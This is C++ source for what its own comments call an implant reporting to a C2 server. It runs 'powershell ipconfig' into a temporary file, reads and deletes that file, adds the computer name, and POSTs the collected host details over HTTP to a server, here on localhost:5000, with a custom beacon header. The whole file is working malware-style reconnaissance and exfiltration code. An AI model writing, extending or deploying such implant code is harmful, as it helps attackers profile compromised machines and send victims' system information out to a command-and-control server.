#include <cstdlib>
#include <fstream>
#include <iostream>
#include "httpClient.h"

#define INFO_BUFFER_SIZE 32767
/* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
int wmain()
{
    // implant first checks the Computer Name and IP address. Then sends it to the c2
    std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
    std::ifstream temp_file("C:\\Users\\User\\test.txt");
    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
    std::remove("C:\\Users\\User\\test.txt");

    char infoBuf[INFO_BUFFER_SIZE];
    DWORD bufCharCount = INFO_BUFFER_SIZE;
    GetComputerNameA((LPSTR)infoBuf, &bufCharCount);
    first_impression.append(infoBuf);
    printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());

    // if successful, connect to the server
    HTTP *client = new HTTP();
    int port = 5000, tls = 0;
    client->connectToServer(L"localhost", port);
    if(!client->checkConnection()){
        wprintf(L"Error, couldn't connect to server\n");
        return 1;
    }

    client->additionalHeader = L"ch0nk: lol";
    client->header_size = 10;
    std::wcout << client->makeHttpRequest(L"GET", L"/", tls) << std::endl;
    client->requestData = (char*)first_impression.c_str();
    client->data_size = first_impression.size();
    std::wcout << client->makeHttpRequest(L"POST", L"/", tls) << std::endl;

    delete client;
    return 0;
}
